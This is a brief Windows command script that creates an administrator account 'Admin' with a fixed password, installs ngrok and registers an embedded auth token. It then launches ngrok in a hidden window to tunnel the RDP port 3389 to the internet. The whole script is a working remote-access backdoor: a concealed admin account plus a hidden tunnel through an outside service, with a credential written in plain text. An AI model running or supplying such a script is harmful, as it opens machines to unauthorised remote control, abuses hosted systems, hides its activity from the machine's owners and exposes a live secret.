net user /add Admin P@ssw0rd! 
net localgroup administrators /add Admin
choco install ngrok -y
ngrok config add-authtoken 2dumqfNwOrYeLZWxq5jCHAJvnq2_3SSomQfvvbASdUDZiQMT
powershell -command Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
sleep 240

